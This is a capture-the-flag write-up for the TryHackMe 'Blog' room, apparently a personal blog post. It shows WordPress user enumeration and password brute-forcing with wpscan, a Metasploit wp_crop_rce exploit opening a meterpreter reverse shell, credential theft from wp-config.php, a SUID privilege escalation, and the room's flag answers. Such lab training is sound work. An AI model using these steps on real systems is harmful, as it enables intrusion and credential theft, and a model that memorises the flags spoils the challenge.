# Blog

**Date:** 16, January, 2021

**Author:** Dhilip Sanjay S

---
[Click Here](https://tryhackme.com/room/blog) to go to the TryHackMe room.

## Initial Setup
- Inorder to get the blog running, enter the `<MACHINE_IP>  blog.thm` in `/etc/hosts`.

## Enumeration

- Running Nmap
```bash
nmap -sV <MACHINE_IP> | tee nmap.output 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-16 16:19 IST
Nmap scan report for blog.thm (<MACHINE_IP>)
Host is up (0.18s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds
```

- Running wpscan along with user enumeration
```
wpscan --url <MACHINE_IP> --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.13
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://<MACHINE_IP>/ [<MACHINE_IP>]
[+] Started: Sat Jan 16 16:05:56 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://<MACHINE_IP>/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://<MACHINE_IP>/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://<MACHINE_IP>/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://<MACHINE_IP>/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://<MACHINE_IP>/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://<MACHINE_IP>/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://<MACHINE_IP>/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://<MACHINE_IP>/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://<MACHINE_IP>/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jan 16 16:06:01 2021
[+] Requests Done: 35
[+] Cached Requests: 29
[+] Data Sent: 6.651 KB
[+] Data Received: 174.517 KB
[+] Memory used: 120.512 MB
[+] Elapsed time: 00:00:05
```

- After finding the usernames, add the two usernames **kwheel**, **bjoel** to a text file and then perform **Password Bruteforcing** attack using wpscan.
```bash
wpscan --url <MACHINE_IP> -P /usr/share/wordlists/rockyou.txt -U users.txt
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                                                                                              
^Cying bjoel / cavalos Time: 00:42:01 <                                                                                                           > (30305 / 28691647)  0.10%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1
```

- Using Metasploit:
```bash
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS <MACHINE_IP>
RHOSTS => <MACHINE_IP>
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD kwheel
PASSWORD => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     <MACHINE_IP>    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 192.168.0.105:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Attempting to clean up files...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/wp_crop_rce) > set LHOST <TRYHACKME_IP>
LHOST => <TRYHACKME_IP>
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on <TRYHACKME_IP>:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to <MACHINE_IP>
[*] Meterpreter session 1 opened (<TRYHACKME_IP>:4444 -> <MACHINE_IP>:47098) at 2021-01-16 16:44:39 +0530
[*] Attempting to clean up files...

meterpreter > pwd
/var/www/wordpress
```
- You can notice that the exploit was successfully executed, but still there was no meterpreter shell. 
- This is because, I forgot to set LHOST to <TRYHACKME_IP>.
- After setting my Tryhackme IP, I was able to get the meterpreter shell.


### root.txt
- **Answer:** 9a0b2b618bef9bfa7ac28c1353d9f318

```bash
meterpreter > cd ../../home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-05-27 01:38:48 +0530  bjoel

meterpreter > cd bjoel
meterpreter > ls
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
20666/rw-rw-rw-   0      cha   2021-01-16 15:45:34 +0530  .bash_history
100644/rw-r--r--  220    fil   2018-04-05 00:00:26 +0530  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-05 00:00:26 +0530  .bashrc
40700/rwx------   4096   dir   2020-05-25 18:45:58 +0530  .cache
40700/rwx------   4096   dir   2020-05-25 18:45:58 +0530  .gnupg
100644/rw-r--r--  807    fil   2018-04-05 00:00:26 +0530  .profile
100644/rw-r--r--  0      fil   2020-05-25 18:46:22 +0530  .sudo_as_admin_successful
100644/rw-r--r--  69106  fil   2020-05-27 00:03:24 +0530  Billy_Joel_Termination_May20-2020.pdf
100644/rw-r--r--  57     fil   2020-05-27 01:38:47 +0530  user.txt

meterpreter > cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

- Let's try to find out if there is any password in `wp-config.php` file.

```bash
python -c "import pty; pty.spawn('/bin/bash')"
www-data@blog:/$cd var/www/wordpress
www-data@blog:/var/www/wordpress$ grep -E "(password|PASSWORD)" wp-config.php

grep -E "(password|PASSWORD)" wp-config.php
/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

```
- That's the password for bjoel.
---
- Run the [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) script.
- Privilege Escalation by `/usr/sbin/checker`
```bash
www-data@blog:/var/www/wordpress$ export admin=admin
export admin=admin
www-data@blog:/var/www/wordpress$ cd /usr/sbin
cd /usr/sbin
www-data@blog:/usr/sbin$ ./checker
./checker
root@blog:/usr/sbin# whoami
whoami
root
root@blog:/usr/sbin# cd ../../root   
cd ../../root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt   
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

---

### user.txt
- **Answer:** c8421899aae571f7af486492b71a8ab7
- **Steps to reproduce:**
```bash
root@blog:/# find . -name user.txt
find . -name user.txt
./home/bjoel/user.txt
./media/usb/user.txt
find: './proc/2370/task/2370/net': Invalid argument
find: './proc/2370/net': Invalid argument
find: './proc/2373/task/2373/net': Invalid argument
find: './proc/2373/net': Invalid argument
find: './proc/2388/task/2388/net': Invalid argument
find: './proc/2388/net': Invalid argument
find: './proc/2398/task/2398/net': Invalid argument
find: './proc/2398/net': Invalid argument
find: './proc/2404/task/2404/net': Invalid argument
find: './proc/2404/net': Invalid argument
find: './proc/2414/task/2414/net': Invalid argument
find: './proc/2414/net': Invalid argument
root@blog:/# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```


### Where was user.txt found?
- **Answer:** /media/usb

---

### What CMS was Billy using?
- **Answer:** WordPress

---

### What version of the above CMS was being used?
- **Answer:** 5.0
- By running wpscan.

---